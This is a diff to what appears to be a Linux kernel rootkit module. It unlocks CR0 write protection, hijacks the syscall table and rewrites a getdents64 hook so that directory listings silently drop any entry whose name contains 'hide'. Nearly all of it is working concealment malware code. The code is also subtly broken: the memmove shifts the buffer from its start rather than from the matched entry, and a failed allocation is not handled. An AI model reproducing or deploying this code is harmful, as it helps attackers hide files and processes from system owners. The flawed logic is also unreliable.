@@ -9,6 +9,7 @@
 #include <linux/uidgid.h>
 #include <linux/dirent.h>
 
+
 #define CR0_WRITE_UNLOCK(x) \
 	do { \
 		unsigned long __cr0; \
@@ -54,15 +55,47 @@ asmlinkage int totallyReal_mkdir(const char *pathname, mode_t mode){
 	return ((typeof(sys_mkdir)*)(original_syscallPtrs[2]))(pathname, mode);
 }
 
-#define process_to_hide "hide_"
+#define process_to_hide "hide"
 
-asmlinkage long totallyReal_getdents64(unsigned int fd, struct linux_dirent64 __user * dire, unsigned int count) {
-	pr_info("Intercepted getdents of fd=%d %p %d\n", fd, dire, count);
-	
+asmlinkage long totallyReal_getdents64(unsigned int fd, struct linux_dirent64 __user * dirp, unsigned int count) {
+	pr_info("FAKEGETDENTS: Intercepted getdents of fd=%d %p %d\n", fd, dirp, count);
+	// output is the number of bytes read
 	int output;
-	output = ( ( typeof(sys_getdents64)* )(original_syscallPtrs[3]) )(fd, dire, count);
+	output = ( ( typeof(sys_getdents64)* )(original_syscallPtrs[3]) )(fd, dirp, count);
+	struct linux_dirent64 *mod_dirp;
+	if (output == -1) {
+		pr_info("FAKEGETDENTS: error calling original function \n");
+		return -1;
+	}
+	else {
+		pr_info("FAKEGETDENTS: successfully read getdents");
+	}
+
+	mod_dirp = kvmalloc(output, GFP_KERNEL);
+	if (mod_dirp == NULL) {
+		pr_info("FAKEGETDENTS: Error");
+		kvfree( mod_dirp );
+	}
 	
+	copy_from_user( mod_dirp, dirp, output);
 	
+	long offset = 0;
+	struct linux_dirent64 *p_dirp;
+	while( offset < output) {
+		p_dirp = (void *) mod_dirp + offset;
+		if (strstr(p_dirp->d_name, process_to_hide) != NULL ) {
+			pr_info("FAKEGETDENTS: hiding %s", p_dirp->d_name);
+			output -= p_dirp->d_reclen;
+			memmove(mod_dirp, (void *)mod_dirp + p_dirp->d_reclen, output);
+			continue;
+		}
+		else {
+			pr_info("FAKEGETDENTS: normal file '%s'\n", p_dirp->d_name);
+		}
+		offset += p_dirp->d_reclen;
+	}
+	copy_to_user(dirp, mod_dirp, output);
+	kvfree(mod_dirp);
 	return output;
 }
 
